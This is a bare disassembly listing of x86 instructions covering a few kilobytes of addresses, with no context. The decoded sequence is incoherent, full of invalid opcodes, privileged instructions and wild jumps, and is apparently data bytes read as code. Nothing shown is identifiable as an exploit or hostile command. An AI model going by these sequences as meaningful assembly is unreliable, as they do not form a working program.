  4291b9:	add    ch,cl
  4291bb:	dec    ecx
  4291bc:	jns    0x4291be
  4291be:	add    cl,ch
  4291c0:	mov    al,0xfe
  4291c2:	jmp    FWORD PTR [ecx-0x1e]
  4291c5:	loop   0x4291ca
  4291c7:	jmp    0xa97194a9
  4291cc:	arpl   bx,bp
  4291ce:	jle    0x429161
  4291d0:	mov    bh,0xad
  4291d2:	add    eax,0x3e2ca8e
  4291d7:	xchg   BYTE PTR [ebp+0x22],bl
  4291da:	push   cs
  4291db:	sub    DWORD PTR [ecx-0x2c],edi
  4291de:	mov    WORD PTR [ebp-0x14bd7a8a],?
  4291e4:	add    BYTE PTR [eax],al
  4291e6:	add    BYTE PTR [eax],al
  4291e8:	add    ch,ch
  4291ea:	inc    ecx
  4291eb:	je     0x4291ea
  4291ed:	mov    fs,WORD PTR [ebx+edx*1]
  4291f0:	jmp    0xde030f6b
  4291f5:	jnp    0x4291cb
  4291f7:	cli    
  4291f8:	aad    0xda
  4291fa:	or     dl,BYTE PTR [eax+0x51]
  4291fd:	lods   al,BYTE PTR ds:[esi]
  4291fe:	push   cs
  4291ff:	add    cl,ch
  429201:	xchg   esp,eax
  429202:	je     0x429208
  429204:	jmp    0xe56647fc
  429209:	jbe    0x4291df
  42920b:	xchg   BYTE PTR [ecx],bl
  42920d:	fld    QWORD PTR [edx]
  42920f:	das    
  429210:	sub    DWORD PTR [ebx-0x1a],esp
  429213:	jle    0x42922c
  429215:	aaa    
  429216:	lods   eax,DWORD PTR ds:[esi]
  429217:	or     ecx,DWORD PTR [esi]
  429219:	retf   0x7e2
  42921c:	push   es
  42921d:	pop    ebp
  42921e:	ds push cs
  429220:	test   eax,0x64f07d76
  429225:	cmp    al,0x3
  429227:	test   DWORD PTR [ecx],ebp
  429229:	sub    ah,BYTE PTR [edx]
  42922b:	call   0x450ec1
  429230:	fs mov ecx,0xb43f06ae
  429236:	scas   al,BYTE PTR es:[edi]
  429237:	and    ebx,ebp
  429239:	es push ds
  42923b:	or     BYTE PTR [eax],al
  42923d:	push   esp
  42923e:	add    al,BYTE PTR [eax]
  429240:	pop    esi
  429241:	fimul  WORD PTR [edx]
  429243:	add    BYTE PTR [ebx-0x76],dl
  429246:	xchg   ecx,esi
  429248:	push   edi
  429249:	xchg   edi,eax
  42924a:	test   BYTE PTR [esi+esi*8+0x0],0x0
  429252:	js     0x429292
  429254:	sbb    BYTE PTR ds:0x400cfc,0x9f
  42925b:	ret    
  42925c:	div    BYTE PTR [ebp+0x14]
  42925f:	ret    
  429260:	jae    0x429286
  429262:	sbb    al,0xc3
  429264:	retf   0xf48b
  429267:	ret    
  429268:	sub    eax,0xd8880fff
  42926d:	(bad)  
  42926e:	shl    BYTE PTR [esi],0x8c
  429271:	dec    esp
  429272:	in     eax,0xff
  429274:	out    0xd6,eax
  429276:	retf   0x1
  429279:	test   BYTE PTR [edx+edi*2+0x2d88d0e],bl
  429280:	push   eax
  429281:	mov    ecx,edx
  429283:	ret    0x2473
  429286:	enter  0x484,0x58
  42928a:	or     al,0xea
  42928c:	mov    esp,0xb0018c17
  429291:	add    DWORD PTR [edi-0x2c3fd604],eax
  429297:	and    edx,DWORD PTR [edx-0x3e]
  42929a:	cwde   
  42929b:	add    DWORD PTR [ebx+0x7c],edi
  42929e:	mov    eax,0xda52fffd
  4292a3:	pop    edx
  4292a4:	sbb    al,0xe7
  4292a7:	icebp  
  4292a8:	jae    0x4292e3
  4292aa:	xlat   BYTE PTR ds:[ebx]
  4292ab:	xor    eax,0x10c12bf
  4292b0:	jnp    0x4292ad
  4292b2:	push   ebx
  4292b3:	ins    BYTE PTR es:[edi],dx
  4292b4:	add    edi,edi
  4292b6:	add    BYTE PTR [eax],al
  4292b8:	add    BYTE PTR [eax],al
  4292ba:	add    BYTE PTR [eax+0x75ff0b2a],ch
  4292c0:	je     0x42924e
  4292c2:	fadd   DWORD PTR [edx+0xd]
  4292c5:	inc    ecx
  4292c6:	shr    esi,cl
  4292c8:	inc    edx
  4292c9:	mov    cl,BYTE PTR [edx+edx*4+0x2a]
  4292cd:	daa    
  4292ce:	jg     0x429253
  4292d0:	sub    edi,edi
  4292d2:	xor    DWORD PTR ds:0x738714ef,0xfffffff8
  4292d9:	inc    eax
  4292da:	je     0x429335
  4292dc:	das    
  4292dd:	add    al,0xc3
  4292df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292e0:	xor    DWORD PTR [ecx+0x6f2b7512],0x1
  4292e7:	push   cs
  4292e8:	sub    ebp,esi
  4292ea:	mov    edi,0xbddd1552
  4292ef:	jno    0x42931c
  4292f1:	fsqrt  
  4292f3:	mov    BYTE PTR [ebx-0x598abfeb],cl
  4292f9:	ds jp  0x42932c
  4292fc:	sbb    BYTE PTR [edi+0x2f],al
  4292ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429300:	jae    0x429284
  429302:	rol    BYTE PTR [ebx+0x33],0x10
  429306:	mov    bl,0x79
  429308:	xchg   ebp,eax
  429309:	test   bl,bh
  42930b:	push   ebp
  42930c:	outs   dx,DWORD PTR ds:[esi]
  42930d:	push   es
  42930e:	jg     0x4292c2
  429310:	repz test al,0x7e
  429313:	mov    ds:0x3401b81e,al
  429318:	imul   edi,esp,0xec1311cf
  42931e:	rol    BYTE PTR [eax],0x0
  429321:	add    BYTE PTR [eax],al
  429323:	add    al,bh
  429325:	ror    DWORD PTR ss:[ebp+ebp*1-0x2367dfc],1
  42932d:	push   esp
  42932e:	adc    BYTE PTR [ebx-0x47b904f],dh
  429334:	xchg   ebp,eax
  429335:	mov    ch,0x5
  429337:	jg     0x429373
  429339:	sub    eax,0x35a7ea8
  42933e:	in     eax,dx
  42933f:	mov    dh,0x76
  429341:	retf   0xbd2f
  429344:	push   eax
  429345:	aam    0xd
  429347:	push   esi
  429348:	mov    DWORD PTR [ebx],0x7bf4464
  42934e:	je     0x429360
  429350:	jne    0x429323
  429352:	push   ss
  429353:	(bad)  
  429354:	adc    al,BYTE PTR [ebx]
  429356:	fiadd  DWORD PTR [ebx]
  429358:	jne    0x429349
  42935a:	lahf   
  42935b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42935c:	in     eax,dx
  42935d:	push   es
  42935e:	sub    eax,DWORD PTR [ebx-0x3e]
  429361:	int3   
  429362:	(bad)  
  429363:	pop    edx
  429364:	repnz xor ah,dl
  429367:	jbe    0x4293e0
  429369:	test   DWORD PTR [ecx],edi
  42936b:	push   esp
  42936c:	xchg   edi,eax
  42936d:	jg     0x4293ee
  42936f:	or     eax,0x76e9fd66
  429374:	sub    ebp,DWORD PTR [eax]
  429376:	rcl    DWORD PTR [eax-0x7cfc8cbb],cl
  42937c:	jecxz  0x42937b
  42937e:	fld    DWORD PTR [esi]
  429380:	js     0x4293cb
  429382:	pop    edx
  429383:	add    al,0x75
  429385:	daa    
  429386:	jecxz  0x429318
  429388:	add    BYTE PTR [eax],al
  42938a:	add    BYTE PTR [eax],al
  42938c:	add    BYTE PTR ds:0xc382c393,ah
  429392:	std    
  429393:	mov    ecx,0x3a69781f
  429398:	add    al,0x75
  42939a:	jle    0x4293aa
  42939c:	mov    eax,0xc4e80a77
  4293a1:	dec    eax
  4293a2:	push   edi
  4293a3:	push   cs
  4293a4:	pop    es
  4293a5:	mov    ch,0x22
  4293a7:	in     eax,0x8b
  4293a9:	je     0x42941a
  4293ab:	call   0xfe434b32
  4293b0:	jns    0x4293c9
  4293b2:	jge    0x4293dd
  4293b4:	mov    ecx,0xb91e7e7a
  4293b9:	jbe    0x42942d
  4293bb:	add    al,ch
  4293bd:	(bad)  
  4293be:	xor    al,0x31
  4293c0:	sub    DWORD PTR [ebx],edi
  4293c2:	int3   
  4293c3:	mov    esi,0x7f25fe3c
  4293c8:	int    0x7a
  4293ca:	mov    bl,0x64
  4293cc:	aad    0x76
  4293ce:	ret    
  4293cf:	push   ecx
  4293d0:	(bad)  
  4293d1:	std    
  4293d2:	cli    
  4293d3:	mov    ebp,?
  4293d5:	js     0x429452
  4293d7:	inc    ebp
  4293d8:	in     eax,dx
  4293d9:	mul    ecx
  4293db:	call   FWORD PTR ds:0xf2f7c4f0
  4293e1:	popa   
  4293e2:	pop    es
  4293e3:	jg     0x42938a
  4293e5:	jbe    0x4293e9
  4293e7:	add    BYTE PTR [edx+0x3d],dh
  4293ea:	add    edi,DWORD PTR [edi-0x77]
  4293ed:	je     0x429378
  4293ef:	inc    ebp
  4293f0:	xchg   ebp,eax
  4293f1:	add    BYTE PTR [eax],al
  4293f3:	add    BYTE PTR [eax],al
  4293f5:	add    BYTE PTR [edi-0x3],cl
  4293f8:	xchg   ah,bh
  4293fa:	jle    0x429477
  4293fc:	enter  0xb56a,0x2e
  429400:	add    BYTE PTR [edx+0x40],ah
  429403:	scas   al,BYTE PTR es:[edi]
  429404:	sbb    esp,DWORD PTR [edx+0x30]
  429407:	jmp    0x4293f9
  429409:	fiadd  DWORD PTR [edx-0x53dcef84]
  42940f:	push   cs
  429410:	je     0x4293fe
  429412:	mov    dh,0xeb
  429414:	rcr    bl,0x82
  429417:	jnp    0x429411
  429419:	adc    dh,BYTE PTR [ebx-0x3e]
  42941c:	mov    BYTE PTR [esi+edi*2+0x59f0d1b],ah
  429423:	mov    ch,0x7
  429425:	bound  esp,QWORD PTR [ecx+0x2a]
  429428:	(bad)  
  429429:	in     eax,dx
  42942a:	jbe    0x42942e
  42942c:	xchg   DWORD PTR [ecx],esp
  42942e:	inc    esp
  429430:	sti    
  429431:	bound  edi,QWORD PTR [ebp-0x1a2272fa]
  429437:	std    
  429438:	(bad)  
  429439:	call   FWORD PTR [esi+eax*1-0x18]
  42943d:	es inc ecx
  42943f:	push   es
  429440:	add    BYTE PTR [esp+ecx*4+0x4cab8400],al
  429447:	push   es
  429448:	add    BYTE PTR [ebp+0x53156b5b],al
  42944e:	mov    edi,0xf029cee7
  429454:	test   BYTE PTR [ebx-0x317d3d7f],0x0
  42945b:	add    BYTE PTR [eax],al
  42945d:	add    BYTE PTR [eax],al
  42945f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429460:	std    
  429461:	mov    BYTE PTR [ecx*8-0x6ff03f77],al
  429468:	add    DWORD PTR [eax],0x44f80c00
  42946e:	adc    BYTE PTR ds:0x598b697a,bl
  429474:	ret    0xc682
  429477:	xchg   edi,eax
  429478:	push   es
  429479:	lea    eax,[esp+edx*4]
  42947c:	cmp    DWORD PTR [eax],0x0
  42947f:	lock dec esi
  429481:	xor    BYTE PTR [eax],0x82
  429484:	out    dx,eax
  429485:	adc    al,0xc4
  429487:	mov    esi,0xc84fb45
  42948c:	jno    0x4294db
  42948e:	xor    ecx,DWORD PTR [esi-0x637a09cd]
  429494:	jo     0x4294a7
  429496:	mov    bl,al
  429498:	ss jnp 0x429494
  42949b:	ins    BYTE PTR es:[edi],dx
  42949c:	push   0x3
  42949e:	add    BYTE PTR [ebp-0x3],0x7f
  4294a2:	stc    
  4294a3:	nop
  4294a4:	jbe    0x4294a7
  4294a6:	inc    edx
  4294a7:	shr    DWORD PTR [edx],cl
  4294a9:	repz jl 0x4294e2
  4294ac:	sbb    edi,DWORD PTR [ebp-0x73cc6773]
  4294b2:	push   eax
  4294b3:	imul   ecx,DWORD PTR [ecx+0x2f7578ca],0xffffff89
  4294ba:	or     al,0x3f
  4294bc:	fwait
  4294bd:	ss and cl,ch
  4294c0:	xor    edi,DWORD PTR [edi-0x17]
  4294c3:	add    BYTE PTR [eax],al
  4294c5:	add    BYTE PTR [eax],al
  4294c7:	add    BYTE PTR [ebx+ebx*4+0x36],bh
  4294cb:	add    al,0xea
  4294cd:	pop    ds
  4294ce:	mov    DWORD PTR [ebp-0x24],0xcbf9f82f
  4294d5:	aaa    
  4294d6:	add    al,0xcb
  4294d9:	xor    ecx,edi
  4294db:	push   edx
  4294dc:	stos   DWORD PTR es:[edi],eax
  4294dd:	inc    ebx
  4294de:	lea    edx,ds:0x4451b75
  4294e4:	sbb    ecx,DWORD PTR gs:[eax-0x3d8fd2bb]
  4294eb:	sti    
  4294ec:	pop    esp
  4294ed:	fimul  WORD PTR [ebx]
  4294ef:	or     esi,edi
  4294f1:	dec    edi
  4294f2:	cmp    al,0xfb
  4294f4:	adc    dh,BYTE PTR [ecx+eax*8-0x270e5505]
  4294fb:	enter  0x2b37,0xff
  4294ff:	xchg   BYTE PTR [eax-0x22057781],dh
  429505:	fist   WORD PTR [edx]
  429507:	add    BYTE PTR [ebp-0x64],dh
  42950a:	inc    esi
  42950b:	sti    
  42950c:	into   
  42950d:	test   dl,dl
  42950f:	xchg   cl,cl
  429511:	fwait
  429512:	sub    cl,BYTE PTR [esi+esi*8]
  429515:	cmp    eax,0x79260037
  42951a:	mov    dh,ch
  42951c:	test   BYTE PTR [eax],0x4
  42951f:	lea    esp,[ecx+0x23]
  429522:	aam    0x88
  429524:	cmp    bh,al
  429526:	test   DWORD PTR [ebp-0x5f],edx
  429529:	add    edi,DWORD PTR [esi]
  42952b:	or     eax,DWORD PTR [eax]
  42952d:	add    BYTE PTR [eax],al
  42952f:	add    BYTE PTR [eax],al
  429531:	neg    cl
  429533:	(bad)  
  429534:	push   DWORD PTR [ebp-0x5b]
  429537:	push   es
  429538:	or     BYTE PTR [ecx+eax*1-0x7d8f4837],0x20
  429540:	or     al,BYTE PTR [ecx]
  429542:	jmp    FWORD PTR [eax+0x3a]
  429545:	push   0xfdc3e0b1
  42954a:	lds    eax,FWORD PTR [eax+edi*8]
  42954d:	sub    BYTE PTR [ebp+0x20f801],dh
  429553:	data16 arpl WORD PTR [ebp+0x2],si
  429557:	jmp    0x61c002e5
  42955c:	add    eax,0xb0022bf5
  429561:	jns    0x4294e5
  429563:	into   
  429564:	out    0xc1,al
  429566:	pop    ss
  429567:	pusha  
  429568:	mov    ecx,0x8dfd1c2e
  42956d:	jle    0x4294f1
  42956f:	shl    ah,0xa6
  429572:	jmp    FWORD PTR [eax+0x3d]
  429575:	ins    BYTE PTR es:[edi],dx
  429576:	scas   al,BYTE PTR es:[edi]
  429577:	jecxz  0x4294fc
  429579:	or     al,0xfe
  42957b:	and    al,BYTE PTR [ecx]
  42957d:	mov    dh,0xeb
  42957f:	sahf   
  429580:	mov    dh,0x18
  429582:	jl     0x429536
  429584:	out    dx,eax
  429585:	and    bl,BYTE PTR [ecx+eax*8]
  429588:	sti    
  429589:	(bad)  
  42958a:	mov    ch,0xd5
  42958c:	idiv   BYTE PTR [ebp-0x25c4dd83]
  429592:	add    al,0x28
  429594:	int3   
  429595:	add    BYTE PTR [eax],al
  429597:	add    BYTE PTR [eax],al
  429599:	add    BYTE PTR [edx-0x16],bl
  42959c:	or     al,0xb0
  42959e:	int    0x38
  4295a0:	sub    BYTE PTR ds:0xfea20541,al
  4295a6:	enter  0x4cb4,0xff
  4295aa:	shl    BYTE PTR [ebp+0x2e403ae5],0x6e
  4295b1:	pop    ebx
  4295b2:	push   edx
  4295b3:	int    0x3c
  4295b5:	(bad)  
  4295b6:	xor    BYTE PTR [edx],ch
  4295b8:	add    BYTE PTR [ebp+ebp*2+0x7d],ah
  4295bc:	add    al,0xe9
  4295be:	jbe    0x4295c2
  4295c0:	call   0x44f825
  4295c5:	cmp    DWORD PTR gs:[esi-0x4ae593cb],esi
  4295cc:	add    eax,0x2a9ab6da
  4295d1:	jg     0x429609
  4295d3:	das    
  4295d4:	cmp    edx,DWORD PTR [edx]
  4295d6:	je     0x429603
  4295d8:	jne    0x4295cf
  4295da:	jmp    0x42964a
  4295dc:	call   0xfb6e2071
  4295e1:	jb     0x42965f
  4295e3:	xchg   DWORD PTR [ebp-0x1f],edx
  4295e6:	icebp  
  4295e7:	add    eax,0xb6b66c91
  4295ec:	adc    esi,ecx
  4295ee:	xor    eax,0x651c8737
  4295f3:	ret    
  4295f4:	mov    BYTE PTR [ebx*2+0x27c0c387],bh
  4295fb:	sub    al,0xfb
  4295fd:	scas   al,BYTE PTR es:[edi]
  4295fe:	add    BYTE PTR [eax],al
  429600:	add    BYTE PTR [eax],al
  429602:	add    BYTE PTR [ebx],al
  429604:	(bad)
  429607:	jge    0x429590
  429609:	inc    ebp
  42960a:	mov    eax,ds:0x26e7ebf3
  42960f:	add    al,BYTE PTR gs:[eax]
  429612:	push   0x3e
  429614:	sub    ebx,DWORD PTR [ebx+0x27]
  429617:	retf   0xbf39
  42961a:	adc    al,0xf2
  42961c:	sbb    eax,0xaf72857f
  429621:	fs jno 0x42969a
  429624:	mov    edi,0xaf807251
  429629:	and    ecx,ebp
  42962b:	in     eax,dx
  42962c:	or     eax,0xc4e9be48
  429631:	sti    
  429632:	pusha  
  429633:	int    0x32
  429635:	aaa    
  429636:	add    BYTE PTR [edi-0x4],bl
  429639:	jp     0x429610
  42963b:	mov    WORD PTR [edx],es
  42963d:	add    BYTE PTR [edi],cl
  42963f:	sbb    edi,ebx
  429641:	jp     0x42963c
  429643:	jl     0x4296b7
  429645:	add    eax,0x69fe5583
  42964a:	pi2fw  mm5,mm6
  42964e:	ja     0x4295e6
  429650:	xchg   eax,eax
  429652:	add    dl,ch
  429654:	inc    edx
  429655:	idiv   DWORD PTR [ebx]
  429657:	lahf   
  429658:	ja     0x429639
  42965a:	cmp    ecx,DWORD PTR [edi+0x4cb17af8]
  429660:	add    al,BYTE PTR [eax]
  429662:	jnp    0xbb2361
  429668:	add    BYTE PTR [eax],al
  42966a:	add    BYTE PTR [eax],al
  42966c:	pop    esi
  42966d:	xchg   ecx,edi
  42966f:	daa    
  429670:	test   al,0x2d
  429672:	jp     0x42966d
  429674:	outs   dx,BYTE PTR ds:[esi]
  429675:	pop    ebp
  429676:	pop    ss
  429677:	mov    ebp,ebp
  429679:	jns    0x4296f8
  42967b:	cld    
  42967c:	inc    edi
  42967d:	ss push es
  42967f:	mov    bh,0x13
  429681:	xchg   ecx,edi
  429683:	and    BYTE PTR [eax+0x11],bl
  429686:	jnp    0x429681
  429688:	adc    eax,0xd5830478
  42968d:	add    eax,0xc38f076e
  429692:	stc    
  429693:	cmp    ah,bh
  429695:	je     0x429675
  429697:	mov    esp,DWORD PTR [ebx]
  429699:	and    bl,dl
  42969b:	jmp    0x429660
  42969d:	arpl   WORD PTR [eax],di
  42969f:	pop    ss
  4296a0:	jmp    0x520bc1b8
  4296a5:	inc    ebx
  4296a6:	stc    
  4296a7:	jmp    0x429681
  4296a9:	inc    eax
  4296aa:	jp     0x429694
  4296ac:	fisub  WORD PTR [ebx+0x7a]
  4296af:	cmp    BYTE PTR [eax],al
  4296b1:	pop    esi
  4296b2:	icebp  
  4296b3:	div    BYTE PTR [ebp-0x26]
  4296b6:	(bad)  
  4296b7:	jae    0x429733
  4296b9:	cwde   
  4296ba:	inc    eax
  4296bb:	(bad)  
  4296bc:	outs   dx,DWORD PTR ds:[esi]
  4296bd:	shl    BYTE PTR [ecx-0x553fa127],0x3
  4296c4:	test   BYTE PTR [esi+0x33],0xfe
  4296c8:	(bad)  
  4296c9:	cld    
  4296ca:	in     al,dx
  4296cb:	pop    esp
  4296cc:	mov    DWORD PTR [eax+0xf7c2],esi
  4296d2:	add    BYTE PTR [eax],al
  4296d4:	add    al,dh
  4296d6:	pop    ds
  4296d7:	add    BYTE PTR [esi*2+0x6ed0ff1b],0x3
  4296df:	push   0x7b1b750e
  4296e4:	shr    cl,0x6f
  4296e7:	jp     0x4296c0
  4296e9:	loopne 0x42970c
  4296eb:	hlt    
  4296ec:	mov    edi,0x3fab93dd
  4296f1:	jne    0x4296ce
  4296f3:	sub    al,0x5
  4296f5:	inc    edx
  4296f6:	(bad)  
  4296f7:	aaa    
  4296f8:	xchg   DWORD PTR [esi],esi
  4296fa:	inc    ebx
  4296fb:	or     bh,dh
  4296fd:	xor    bh,BYTE PTR [esp+ecx*4]
  429700:	or     bh,dh
  429702:	or     eax,0xca79893c
  429707:	jns    0x4296c9
  429709:	mov    eax,ds:0xd453853
  42970e:	mov    al,ds:0x5bf6f3d1
  429713:	add    eax,0x8c8f8089
  429718:	ret    
  429719:	or     al,0x38
  42971b:	cmp    bl,bh
  42971d:	repnz lahf 
  42971f:	mov    ecx,0x8c35def7
  429724:	inc    ebp
  429725:	(bad)  [edi+0x4835e7f8]
  42972b:	(bad)  
  42972c:	push   esi
  42972e:	bound  edi,QWORD PTR [eax]
  429730:	pop    ebx
  429731:	sub    eax,DWORD PTR [edx]
  429733:	mov    esi,0x6dd7024a
  429738:	daa    
  429739:	add    BYTE PTR [eax],al
  42973b:	add    BYTE PTR [eax],al
  42973d:	add    BYTE PTR [edx],bh
  42973f:	push   ds
  429740:	std    
  429741:	aam    0x44
  429743:	icebp  
  429744:	sub    eax,0x702d5bd0
  429749:	(bad)  
  42974a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42974b:	jp     0x4296e9
  42974d:	cmp    ebx,DWORD PTR [edi+ecx*8-0x1c]
  429751:	or     bh,dh
  429753:	pop    eax
  429754:	jmp    0xb4bc0c5c
  429759:	cmp    edi,edx
  42975b:	(bad)  
  42975c:	lock xchg BYTE PTR [ecx+0x7a],dh
  429760:	pop    esi
  429761:	adc    esi,DWORD PTR [edi]
  429763:	(bad)  
  429764:	or     DWORD PTR [ebx],eax
  429766:	cld    
  429767:	lds    edx,FWORD PTR [esp+ecx*4]
  42976a:	cmp    ebx,DWORD PTR [eax]
  42976c:	aam    0xa1
  42976e:	fld    TBYTE PTR [edx]
  429770:	leave  
  429771:	scas   eax,DWORD PTR es:[edi]
  429772:	ins    DWORD PTR es:[edi],dx
  429773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429774:	cmp    edi,DWORD PTR gs:[eax+esi*4-0x16]
  429779:	popf   
  42977a:	ret    
  42977b:	sub    ch,ah
  42977d:	lods   eax,DWORD PTR ds:[esi]
  42977e:	imul   edi,DWORD PTR [edi-0x58],0xe8737e02
  429785:	popf   
  429786:	icebp  
  429787:	inc    edx
  429788:	cmp    al,0x23
  42978a:	sbb    al,BYTE PTR [edi]
  42978c:	mov    ds:0x17021fc1,eax
  429791:	aaa    
  429792:	push   0xac3d722
  429797:	jg     0x42978e
  429799:	sti    
  42979a:	icebp  
  42979b:	mov    esi,0xb5e80bef
  4297a0:	pushf  
  4297a1:	lea    eax,[eax]
  4297a3:	add    BYTE PTR [eax],al
  4297a5:	add    BYTE PTR [eax],al
  4297a7:	cmp    BYTE PTR [edx],dh
  4297a9:	sub    DWORD PTR [eax],0x7fe90284
  4297af:	mov    ch,0xb6
  4297b1:	sbb    al,BYTE PTR [ebx-0x16ffd5a8]
  4297b7:	dec    ebp
  4297b9:	repz idiv DWORD PTR [esi-0x5c]
  4297bd:	pop    ds
  4297be:	shl    eax,0x7a
  4297c1:	add    al,0xe2
  4297c3:	sti    
  4297c4:	stos   DWORD PTR es:[edi],eax
  4297c5:	jl     0x42981d
  4297c7:	jns    0x42977f
  4297c9:	pop    es
  4297ca:	ret    
  4297cb:	xchg   esp,eax
  4297cc:	shl    DWORD PTR [ecx+0x70],cl
  4297cf:	jne    0x429784
  4297d1:	inc    edx
  4297d2:	jb     0x429788
  4297d4:	pop    ss
  4297d5:	sti    
  4297d6:	stc    
  4297d7:	inc    ebp
  4297d9:	out    dx,eax
  4297da:	pop    esp
  4297db:	test   DWORD PTR [edi+eiz*8-0x4d8bfe5],esi
  4297e2:	jmp    0x2ab:0x94801bbd
  4297e9:	je     0x4297ca
  4297eb:	sbb    al,0xd
  4297ed:	pop    eax
  4297ee:	(bad)  
  4297ef:	icebp  
  4297f0:	add    eax,0x6b67a677
  4297f5:	bound  esp,QWORD PTR [eax+0x75]
  4297f8:	mov    bl,0xfa
  4297fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297fb:	mov    es,WORD PTR [ebx-0x39c01ebb]
  429801:	or     ebp,esi
  429803:	hlt    
  429804:	aam    0xfa
  429806:	(bad)  
  429807:	imul   eax,DWORD PTR [ebx+0x2ebf],0x0
  42980e:	add    BYTE PTR [eax],al
  429810:	inc    ebx
  429811:	aam    0xc8
  429813:	stos   DWORD PTR es:[edi],eax
  429814:	outs   dx,BYTE PTR ds:[esi]
  429815:	add    bh,bl
  429817:	xor    al,0x65
  429819:	sbb    al,BYTE PTR [ebx+ebx*8+0x76]
  42981d:	add    ch,BYTE PTR [edi]
  42981f:	test   eax,0x72551d5f
  429824:	pop    edx
  429825:	rcl    BYTE PTR [edx+0x72],1
  429828:	cmp    DWORD PTR [ebx+0x31ffe14d],eax
  42982e:	test   DWORD PTR [eax+0x84f725],esp
  429834:	sti    
  429835:	pop    edx
  429836:	jae    0x9d2b8c60
  42983c:	fdiv   st(6),st
  42983e:	inc    DWORD PTR [ebx+ebx*2-0x73ccf98e]
  429845:	aas    
  429846:	call   0x4164db
  42984b:	xor    bl,BYTE PTR [esi+ebx*8-0x78]
  42984f:	add    BYTE PTR [esi+edi*8-0x156674b6],bl
  429856:	or     DWORD PTR [eax-0x74],eax
  429859:	jg     0x429851
  42985b:	call   ecx
  42985d:	cs jp  0x4298dd
  429860:	test   al,0xf3
  429862:	je     0x429886
  429864:	push   es
  429865:	sub    al,0x6
  429867:	mov    esi,0xd0b6039d
  42986c:	aaa    
  42986d:	hlt    
  42986e:	je     0x4298c7
  429870:	aaa    
  429871:	rol    DWORD PTR [ebx+0xc0],0x0
  429878:	add    al,ah
  42987a:	dec    esi
  42987b:	mov    dl,BYTE PTR ds:[ebx+0x1]
  42987f:	mov    dh,0x34
  429881:	add    eax,0x37d0b601
  429886:	hlt    
  429887:	jae    0x429877
  429889:	daa    
  42988a:	inc    esi
  42988b:	push   eax
  42988c:	(bad)  
  42988d:	(bad)  
  42988e:	jnp    0x4298dd
  429890:	or     BYTE PTR [edi+0x487d7aee],dl
  429896:	out    dx,eax
  429897:	je     0x4298a2
  429899:	sub    edi,0xffffffca
  42989c:	mov    ecx,DWORD PTR [ecx-0xa]
  42989f:	mov    BYTE PTR [ebp+0x18],al
  4298a2:	jnp    0x4298f9
  4298a4:	or     al,0x7
  4298a6:	hlt    
  4298a7:	je     0x4298ca
  4298a9:	xchg   ecx,eax
  4298aa:	fdiv   DWORD PTR [ebx+0x1d]
  4298ad:	xchg   ecx,eax
  4298ae:	aam    0x73
  4298b0:	sbb    DWORD PTR [ebp+0x4c],esi
  4298b3:	aas    
  4298b4:	test   edi,eax
  4298b6:	stc    
  4298b7:	or     cl,BYTE PTR [ebx]
  4298b9:	and    ebp,DWORD PTR [ebx+0x4]
  4298bc:	mov    edx,0x7530547a
  4298c1:	jle    0x42989d
  4298c3:	mov    esp,0xb85d8e3f
  4298c8:	jmp    0xf286:0xede81dce
  4298cf:	jp     0x4298c3
  4298d1:	xor    BYTE PTR [eax-0x2f4c78c2],0x5b
  4298d8:	pop    ss
  4298d9:	mov    ch,0x64
  4298db:	or     BYTE PTR [eax+eax*1+0x0],0x0
  4298e0:	add    BYTE PTR [eax],al
  4298e2:	ins    BYTE PTR es:[edi],dx
  4298e3:	call   0x917559c8
  4298e8:	sar    BYTE PTR [ebp-0x7935e483],cl
  4298ee:	xchg   ecx,eax
  4298ef:	imul   ecx,esp,0xc2b47c86
  4298f5:	pop    es
  4298f6:	dec    BYTE PTR [edx]
  4298f8:	jnp    0x4298c3
  4298fa:	loopne 0x429943
  4298fc:	jp     0x4298f9
  4298fe:	jmp    0x5b0b194a
  429903:	adc    dl,BYTE PTR [ebp+0x7a1b7500]
  429909:	sti    
  42990a:	ror    BYTE PTR [eax-0x10],0xbf
  42990e:	mov    ch,0x52
  429910:	nop
  429911:	add    BYTE PTR [ebp+0x1b],dh
  429914:	lock mov edi,0xfffe9f1c
  42991a:	jne    0x429908
  42991c:	mov    BYTE PTR ds:0xffbf4d15,bl
  429922:	imul   DWORD PTR [eax+0x34]
  429925:	jne    0x429989
  429927:	pushf  
  429928:	mov    cl,0xb
  42992a:	or     ch,dh
  42992c:	fimul  WORD PTR [edx]
  42992e:	retf   0xea01
  429931:	add    al,0xc6
  429933:	repnz int 0x33
  429936:	push   0x5744bdc6
  42993b:	jg     0x4298e6
  42993d:	scas   eax,DWORD PTR es:[edi]
  42993e:	dec    ecx
  42993f:	test   DWORD PTR [edx-0x1d8e91ff],ebp
  429945:	add    al,0x0
  429947:	add    BYTE PTR [eax],al
  429949:	add    BYTE PTR [eax],al
  42994b:	push   es
  42994c:	out    dx,al
  42994d:	scas   eax,DWORD PTR es:[edi]
  42994e:	call   0x28be472d
  429953:	cmp    bl,dl
  429955:	popa   
  429956:	push   eax
  429957:	repnz mov dh,0xf0
  42995a:	mov    BYTE PTR [ebp-0x51f82b7c],ah
  429960:	scas   al,BYTE PTR es:[edi]
  429961:	(bad)  
  429963:	lahf   
  429964:	push   esp
  429965:	outs   dx,BYTE PTR ds:[esi]
  429966:	(bad)  
  429967:	jb     0x4299e4
  429969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42996a:	pop    es
  42996b:	cli    
  42996c:	into   
  42996d:	in     al,0xf8
  42996f:	cwde   
  429970:	scas   al,BYTE PTR es:[edi]
  429971:	add    edi,DWORD PTR [edi-0x79]
  429974:	lods   eax,DWORD PTR ds:[esi]
  429975:	(bad)  
  429976:	jle    0x429923
  429978:	lods   eax,DWORD PTR ds:[esi]
  429979:	sti    
  42997a:	lock xor bh,BYTE PTR [esi+0x37]
  42997e:	mov    ch,0x8d
  429980:	not    DWORD PTR [ecx-0xe]
  429983:	outs   dx,DWORD PTR ds:[esi]
  429984:	outs   dx,DWORD PTR ds:[esi]
  429985:	loop   0x42996f
  429987:	dec    ebx
  429988:	scas   al,BYTE PTR es:[edi]
  429989:	jmp    0x6647ce0e
  42998e:	cmp    al,0x4b
  429990:	call   0x1c03db42
  429995:	into   
